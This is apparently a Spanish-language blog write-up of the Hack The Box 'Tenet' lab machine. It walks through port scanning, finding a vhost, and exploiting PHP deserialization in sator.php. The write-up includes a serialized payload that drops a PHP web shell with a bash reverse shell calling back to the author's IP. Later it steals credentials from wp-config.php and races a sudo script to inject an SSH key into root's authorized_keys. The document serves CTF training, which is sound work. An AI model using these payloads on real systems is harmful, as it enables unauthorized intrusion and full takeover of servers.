---
title: "Tenet - Hack The Box"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/data/Tenet.png?raw=true"
  teaser_home_page: true
  icon: "https://github.com/Wiinsad/Wiinsad.github.io/blob/master/assets/images/icons/Hackthebox2.png?raw=true"
categories:
  - Writeup
  - HackTheBox
tags:
  - Deserialization Attacks
  - Virtual Hosting
  - Bash
  - Linux
---

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/tenet/data/TenetHTB.png">
</p>

 La máquina **Tenet** es una máquina virtual vulnerable de la plataforma HackTheBox con un nivel de dificultad **medio** una calificación en el rank de 4.6, **5039 USER OWNS** y **4475 SYSTEM OWNS** con la ip **10.10.10.223** y un sistema operativo **Linux**.


## Port Scan

Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.10.214]** utilizando los parámetros:
  - **-p-:**    Escaneo a toda la gama de puertos (65536).
  - **-n:**     No hacen la resolución del DNS.
  - **-T5:**    El parámetro más agresivo y ruidoso pero más rápido para hacer una exploración rápida.
  - **-v:**     Aumenta el nivel de los mensajes verbose.
  - **--open:** Muestra sólo los puertos con un estatus abierto.
  - **-oG:**    Guarda la el output en formato Grepeable.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/scanPort.png?raw=true">
</p>


Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPort**, vemos que los puertos que destacaron en este caso fueron **22,80**:

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/Ports.png?raw=true">
</p>


Una vez identificados los puertos abiertos, realizaremos un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

  - -sC: Script de enumeración básica de sondeo en puertos y servicios alojados.
  - -sV: Detección de versiones en servicios alojados en puertos.
  - -p : Puertos a inspeccionar.
  - -oN: Formatos de Nmap en los que se guardará el archivo.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/PortServ.png?raw=true">
</p>

De el escaneo de puertos y servicios no pudimos recolectar mucha informacion solo que en el puerto **22** esta alojado un servicio **ssh** y en el puerto **80** esta alojado un servicio **HTTP**, asi que el camino que seguiremos sera por este serviciom entrando al servicio por el navegador se logra ve lo siguiente:

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/web.png?raw=true">
</p>

Un camino para poder descubrir subdirectorios es haciendo un **fuzzing** en la web en este caso usare la herramienta **gobuster**.


Haciendo el fuzzing pude descubrir que hay un wordpress corriendo en la web:

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/wordpress.png?raw=true">
</p>

Al entrar a la ruta veo que la pagina se ve como si estuviera mal montada lo que puede ser un indicio de que probablemente se esta haciendo virtual hosting y entrando al código fuente de la pagina se puedo ver efectivamente que en algunas parte del código fuente se hace mención a **tenet.htb** así que agrego este host a **/etc/hosts** y al volver a entrar a la pagina ya carga correctamente.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/web2.png?raw=true">
</p>

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/web3_000.png?raw=true">
</p>

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/web4.png?raw=true">
</p>

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/web5.png?raw=true">
</p>

Ya que podemos ver bien la pagina empezamos a enumerar y buscar información útil. En la pagina se encuentran unos posts y en uno de ellos se menciona que la pagina esta siendo migrada y ese mismo post tiene un comentario de un usuario "**neil**" el cual menciona lo siguiente:


>  did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
>
>-Neil

Ya sabiendo esto sabemos que puede existir un un **sator.php** y un archivo **backup**.

Haciendo fuzzing tanto en **10.10.10.22** y en **tenet.htb** con gobuster no pude encontrar ningún recurso de estos, ya que tocamos el tema de visual hosting puede que esta misma tenga un subdominio así que probando **backup.tenet.htb** y **sator.tenet.php** ya que son los datos que conocemos y estamos buscamos.

Una vez que los agregamos al **/etc/hosts** y entramos vemos que el subdominio **sator.tenet.htb** nos funciono y ahí se encuentra el recurso **sator.php**.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/sator.png?raw=true">
</p>

En el post se menciona que hay un backup de este recurso así que intente ver si existía un archivo **.bak** y efectivamente así fue había un recurso **sator.php.bak**, este archivo lo pude descargar en mi maquina y contenía lo siguiente:

```bash
<?php

class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```
## Lateral Movement

Lo que hace este archivo en php es deserializar un contenido que es envido por **GET** a **aerpo** y el contenido serializado se enviá a la clase **DatabaseExport** ya deserializado lo que hace la clase es actualizar un archivo users.txt que es el nombre que viene ya predefinido y el campo data que esta en blanco por defecto todo esto es gracias a la función **update_db()** actualiza la data de **users.txt** a **Success** y luego con la clase **__destruct()** elimina el **users.txt** antiguo.

Si entramos a la ruta del archivo en la url vemos que existe:

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/scan/users.png?raw=true">
</p>

Encontré un post el cual explica a detalle como funciona una [**Exploiting PHP Deserialization**](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a) ahí hacen mención a como explotar esto para poder conseguir un **RCE**.


Con lo visto en la web arme el siguiente estructura en php para poder crear un archivo php el cual contenga una **revershell**

```php
class DatabaseExport{
	public $user_file = 'winsad.php';
        public $data = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.15.125/443 0>&1\'"); ?>';
}

print urlencode(serialize(new DatabaseExport));
```

Lo que hace es crear la clases **DatabaseExport** la cual contiene los mismo valores que requiere el archivo **sator.php** y serializarlos para que al momento que **sator.php** los reciba por GET pueda deserializarlo y actualizar la supuesta base de datos pero en este caso el contenido es la creación de un nuevo archivo php con la revershell que punta a mi equipo.
Una vez que serializo la clase del php con **php -a** la data que imprime ya serializada la mando al recurso **sator.php** y le paso por get a la variable **aerpo** la clase serializada:

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/intrusion/seria.png?raw=true">
</p>

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/intrusion/get.png?raw=true">
</p>

Como sale en la pagina **[]Database updated** intuyo que todo salio correcto así que en teoría si me dirijo a la ruta **http://sator.tenet.htb/winsad.php** el contenido que tiene este archivo php se interpretara dándome la shell. Para esto yo ya estaba en mi maquina en escucha por el puerto 443 que es el puerto que especifique en el php y yendo a la url se ve que efectivamente se interpreta el php y me da la conexión y con ella la shell.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/intrusion/load.png?raw=true">
</p>

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/intrusion/shell.png?raw=true">
</p>

## Privilege escalation - User(Neil)
Ya que estamos dentro y yendo a la ruta **/var/www/html/wordpress** puedo encontrar un archivo **wp-config.php** el cual contenía las credenciales del usuario **neil** y con estas misma entramos como ese usuario.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/intrusion/neil.png?raw=true">
</p>

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/intrusion/neilU.png?raw=true">
</p>

## Privilege escalation - Root

Ahora que soy el usuario **neil** empece a enumerar el sistema para encontrar un camino potencial para escalar privilegios a root, usando el comando **sudo -l** pude ver que tenia los siguiente permisos sin proporcionar contraseña a nivel sudo:

```sql
neil@tenet:/var/www/html/wordpress$ sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```

Examinando el archivo veo que lo que hace es plantar una llave publica de ssh en el directorio **/root/.ssh/authorized_keys** en especifico es la función **addkey** la que se encarga de hacer esto y los pasos que sigue son:

  - Crear un archivo en **/tmp/** con un nombre aleatorio pero que siempre empieza con **'ssh-''** (esto es muy importante ya que puede ser una forma potencial para abusar del script).
  - Verifica que exista ese archivo en el directorio.
  - Si existe el archivo imprime el contenido de la variable **$key** en el cual es la llave publica.
  - Elimina el archivo generado en **/tmp**

```bash
addKey() {

	tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

	(umask 110; touch $tmpName)

	/bin/echo $key >>$tmpName

	checkFile $tmpName

	/bin/cat $tmpName >>/root/.ssh/authorized_keys

	/bin/rm $tmpName

}
```

Para continuar en mi maquina me cree un par de llaves ssh una privada y una publica con la herramienta ssh-keygen:

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/intrusion/ssh.png?raw=true">
</p>

Tomando el contenido de la **id_rsa.pub** lo que hice es tener dos sesiones de la maquina ya que en una ejecutare el siguiente ciclo anidado, lo que hace es entrar en un bucle infinito si algún archivo se encuentre en /tmp/ con el nombre de **ssh-***( el asterisco sirve para indica que es un archivo que empieza con ssh- y luego tiene un contenido cualquier)

El ciclo que me arme es el siguiente:

```bash
if [ -f /tmp/ssh-* ]; then while true; do rm /tmp/ssh-* ; echo ' public key ' >> /tmp/ssh-* ;done ; else echo 'No funciono' ;fi
```
Ya teniendo esto preparado lo que hago crear un archivo en **/tmp/** que empiece con **ssh-** y un valor cualquiera, esto lo hago para que el if pueda dar paso al while, ya que entra el while elimina el archivo que creamos para que no haya conflicto con el que se creara con el que crea el **enableSSH-sh**.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/intrusion/root.png?raw=true">
</p>

Haciendo el proceso de crear un archivo y en paralelo iniciar el bucle, ejecute el archivo **enableSSH** con permisos de sudo y veo que al hacerlo en la parte de arriba me sale que **'rm: cannot remove '/tmp/ssh-BKxf6iDh': Operation not permitted'** lo que indica que efectivamente el bucle tomo un archivo que se genero y inyecto mi llave publica, ahora desde mi maquina y con mi llave **id_rsa** en teoría puedo entrar a la maquina como root ya que ahí es donde se agregan las llaves del script **enableSSH**.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/tenet/intrusion/root1.png?raw=true">
</p>

Efectivamente pude acceder a la maquina como root inyectando mi llave publica en el archivo **/roo/.ssh/authorized_keys** abusando del script **enableSSH** y de esta manera finalizando la maquina y rooteandola.
